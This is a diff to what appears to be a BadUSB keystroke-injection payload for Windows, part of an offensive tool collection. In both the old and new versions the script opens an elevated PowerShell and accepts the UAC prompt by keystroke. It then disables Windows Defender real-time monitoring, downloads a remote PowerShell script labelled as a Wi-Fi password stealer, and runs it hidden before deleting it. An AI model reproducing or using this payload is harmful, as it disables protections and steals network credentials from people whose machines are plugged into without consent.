@@ -115,7 +115,7 @@ powershell -e bABzAA==%
 Delay 1000
 GuiR
 WinPrintLine powershell Start-Process powershell -Verb runAs
-Delay 100
+Delay 1000
 Press KEY_LEFT_ALT
 Press Y
 Release
@@ -126,7 +126,11 @@ Release
 
 WinPrintLine Set-MpPreference -DisableRealtimeMonitoring $true
 
-WinPrintLine $d=New-Object Net.WebClient;$u='https://raw.githubusercontent.com/blinhares/bruce-sd-card/c158900b573debf0747dd2bfddcb4b68ccaa968a/BadUSB/Payloads/Credentials/Wifi/WinPwd/script.ps1';$f='t.ps1';$d.DownloadFile($u,$f);powershell -w h -ep Bypass -c "gc $f -Raw|iex";rm $f -ea 0;exit
+WinPrintLine $u='https://raw.githubusercontent.com/b-host/bruce-sd-card/refs/heads/main/BadUSB/Payloads/Credentials/Wifi/WinPwd/script.ps1';
+WinPrintLine $d=New-Object Net.WebClient;
+WinPrintLine $f='t.ps1';$d.DownloadFile($u,$f);
+WinPrintLine powershell -w h -c "gc $f -Raw|iex";rm $f -ea 0;
+
 
 
 
